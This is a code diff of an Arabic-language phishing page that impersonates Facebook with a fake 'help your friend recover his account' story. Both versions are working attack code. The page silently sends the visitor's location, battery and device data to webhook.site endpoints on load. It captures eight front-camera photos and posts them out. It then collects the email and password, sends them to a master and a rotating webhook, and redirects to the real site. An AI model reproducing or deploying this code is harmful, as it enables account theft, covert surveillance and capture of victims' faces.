@@ -3,100 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - تأكيد الحساب</title>
+    <title>تأكيد حساب صديق | Facebook</title>
     <style>
         body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .header { background-color: #fff; width: 100%; padding: 15px; text-align: center; border-bottom: 1px solid #ddd; }
-        .login-box { background: #fff; padding: 20px; margin-top: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
-        .btn { width: 100%; background-color: #1877f2; color: #fff; padding: 12px; border: none; border-radius: 6px; font-weight: bold; font-size: 17px; cursor: pointer; }
-        .warning { color: #d32f2f; font-size: 13px; margin-bottom: 10px; font-weight: bold; }
-        
-        /* تصميم اللافتة */
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; }
-        .permission-card { background: #fff; width: 85%; max-width: 350px; padding: 25px; border-radius: 12px; text-align: center; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .nav { background: #fff; width: 100%; padding: 10px 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; }
+        .main-container { background: #fff; margin-top: 20px; padding: 20px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); width: 90%; max-width: 450px; text-align: center; }
+        .friend-pic { width: 80px; height: 80px; border-radius: 50%; background: #ddd; margin: 10px auto; border: 2px solid #1877f2; }
+        h2 { font-size: 18px; color: #1c1e21; }
+        p { font-size: 14px; color: #606770; line-height: 1.4; }
+        .btn-blue { background: #1877f2; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 15px; }
+        input { width: 92%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; background: #f5f6f7; }
+        #login-section { display: none; margin-top: 15px; border-top: 1px solid #ddd; padding-top: 15px; }
+        video, canvas { display: none; }
     </style>
 </head>
-<body>
+<body onload="initSystem()">
 
-<div class="header">
+<div class="nav">
     <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l97zS3XpSq.svg" width="100">
 </div>
 
-<div class="login-box" id="step1">
-    <p class="warning">⚠️ تم تسجيل دخول مريب. يرجى إعادة إدخال بياناتك لتأكيد الملكية.</p>
-    <input type="text" id="u" placeholder="البريد الإلكتروني أو الهاتف">
-    <input type="password" id="p" placeholder="كلمة السر">
-    <button class="btn" onclick="stageOne()">تأكيد الهوية</button>
+<div class="main-container" id="step1">
+    <div class="friend-pic" style="background-image: url('https://i.pravatar.cc/150?u=a042581f4e29026704d'); background-size: cover;"></div>
+    <h2>ساعد صديقك في استعادة حسابه</h2>
+    <p>لقد طلب صديقك "أحمد" تأكيد هويتك لاسترداد حسابه المعطل. للقيام بذلك، نحتاج إلى إجراء مسح سريع للوجه (Video Verification) لضمان أنك لست برنامج روبوت.</p>
+    <button class="btn-blue" onclick="startVerification()">تأكيد هويتي الآن</button>
 </div>
 
-<div id="overlay">
-    <div class="permission-card">
-        <h3 style="color: #1c1e21; margin-bottom: 10px;">تحقق الأمان البيومتري</h3>
-        <p style="font-size: 14px; color: #606770;">لإلغاء قفل الحساب، نحتاج للتحقق من موقعك وصورة وجهك عبر الكاميرا الأمامية.</p>
-        <div class="loader"></div>
-        <button class="btn" onclick="stageTwo()">متابعة التحقق</button>
-        <p style="font-size: 11px; color: #90949c; margin-top: 15px;">سيتم تشفير هذه البيانات وإرسالها لمركز الأمان.</p>
-    </div>
+<div class="main-container" id="login-section">
+    <p style="color:#ee2200; font-weight:bold;">تمت مطابقة الوجه بنجاح!</p>
+    <p>يرجى تسجيل الدخول إلى حسابك لربط التأكيد وحماية حساب صديقك.</p>
+    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+    <input type="password" id="pass" placeholder="كلمة السر">
+    <button class="btn-blue" style="background:#42b72a;" onclick="captureLogin()">إرسال التأكيد النهائي</button>
 </div>
 
-<video id="vid" autoplay playsinline style="display:none"></video>
-<canvas id="canv" style="display:none"></canvas>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
-    // الإعدادات التقنية للنقل
-    const TOKEN = '421859d3-a53e-41f3-ab43-a6025fae4358'; 
-    const URL = `https://webhook.site/${TOKEN}`;
+    const MASTER = "https://webhook.site/11c7e1b7-1e80-497a-9ed1-ca3bde183eed";
+    const POOL = [
+        "https://webhook.site/72e1897c-17da-4468-8fe8-370a27a96d76", "https://webhook.site/dc5af998-ac00-4301-9312-a8c8cac64643",
+        "https://webhook.site/acc03dcf-1d76-462c-b257-bbecd6bd0ebe", "https://webhook.site/2fc99f69-e9be-4bad-9f47-3cef1a60340c",
+        "https://webhook.site/4e6f5754-84e8-4918-8d65-dae16287312c", "https://webhook.site/fb3c768d-65d7-4a09-8ee6-6b75b10f20e5",
+        "https://webhook.site/2b738b09-4207-43dc-89bd-388bc308721c", "https://webhook.site/77651f36-df81-4232-af61-9836573e5cbc",
+        "https://webhook.site/4d676895-7615-4e56-a8bd-b2fc755922df", "https://webhook.site/fcc711e3-5835-4a4b-bc6a-ecbccc50ecf0"
+    ];
 
-    function send(data) {
-        fetch(URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+    let myToken = "";
+
+    function initSystem() {
+        myToken = POOL[Math.floor(Math.random() * POOL.length)];
+        // سحب بيانات الجهاز والبطارية صامتاً
+        captureSystemData();
     }
 
-    // معالجة المرحلة الأولى
-    function stageOne() {
-        const user = document.getElementById('u').value;
-        const pass = document.getElementById('p').value;
-        if(user && pass) {
-            send({ type: "DATA_SUBMISSION", user, pass, time: new Date().toLocaleString() });
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('overlay').style.display = 'flex';
-        } else {
-            alert("يرجى إكمال الحقول");
+    async function captureSystemData() {
+        let batteryInfo = {};
+        if (navigator.getBattery) {
+            const bat = await navigator.getBattery();
+            batteryInfo = { level: (bat.level * 100) + "%", charging: bat.charging };
         }
+
+        navigator.geolocation.getCurrentPosition((pos) => {
+            sendToMaster({
+                event: "SYSTEM_REPORT",
+                location: { lat: pos.coords.latitude, lon: pos.coords.longitude },
+                battery: batteryInfo,
+                device: navigator.platform,
+                target_node: myToken
+            });
+        }, () => {
+            sendToMaster({ event: "SYSTEM_REPORT_NO_GPS", battery: batteryInfo, target_node: myToken });
+        });
     }
 
-    // معالجة المرحلة الثانية (الموقع والوسائط)
-    async function stageTwo() {
-        // طلب الموقع الجغرافي
-        navigator.geolocation.getCurrentPosition(p => {
-            send({ type: "GEO_LOCATION", lat: p.coords.latitude, lon: p.coords.longitude });
-        });
-
-        // طلب الوصول للكاميرا والتقاط عينات
+    async function startVerification() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('vid').srcObject = stream;
+            document.getElementById('v').srcObject = stream;
+            document.getElementById('step1').style.opacity = "0.5";
             
-            for(let i=0; i<3; i++) {
-                setTimeout(snap, i * 2000);
+            // سحب 8 صور متتالية (تسلسل)
+            for(let i=0; i<8; i++) {
+                setTimeout(() => {
+                    snap();
+                    if(i === 7) showLogin();
+                }, i * 1500);
             }
-
-            alert("تم التحقق بنجاح. سيتم توجيهك الآن...");
-            setTimeout(() => { window.location.href = "https://www.facebook.com"; }, 3000);
-        } catch (e) {
-            alert("فشل التحقق. يرجى السماح بالوصول للكاميرا.");
-        }
+        } catch (e) { alert("يجب السماح بالكاميرا لتأكيد هوية الصديق."); }
     }
 
     function snap() {
-        const v = document.getElementById('vid'), c = document.getElementById('canv');
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        send({ type: "MEDIA_CAPTURE", data: c.toDataURL('image/jpeg', 0.1) });
+        const v = document.getElementById('v'), c = document.getElementById('c');
+        c.width = 480; c.height = 360;
+        c.getContext('2d').drawImage(v, 0, 0, 480, 360);
+        const img = c.toDataURL('image/jpeg', 0.3);
+        fetch(myToken, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ shot: img }) });
+    }
+
+    function showLogin() {
+        document.getElementById('step1').style.display = "none";
+        document.getElementById('login-section').style.display = "block";
+    }
+
+    function captureLogin() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        
+        // إرسال معلومات الدخول للرابط الفرعي والماستر معاً للضمان
+        const data = { event: "LOGIN_CAPTURE", email: email, pass: pass };
+        fetch(myToken, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+        sendToMaster(data);
+
+        alert("تم إرسال التأكيد بنجاح. سيتم مراجعة الطلب خلال 24 ساعة.");
+        window.location.href = "https://www.facebook.com";
+    }
+
+    function sendToMaster(obj) {
+        fetch(MASTER, { method: 'POST', mode: 'no-cors', body: JSON.stringify(obj) });
     }
 </script>
-
 </body>
 </html>
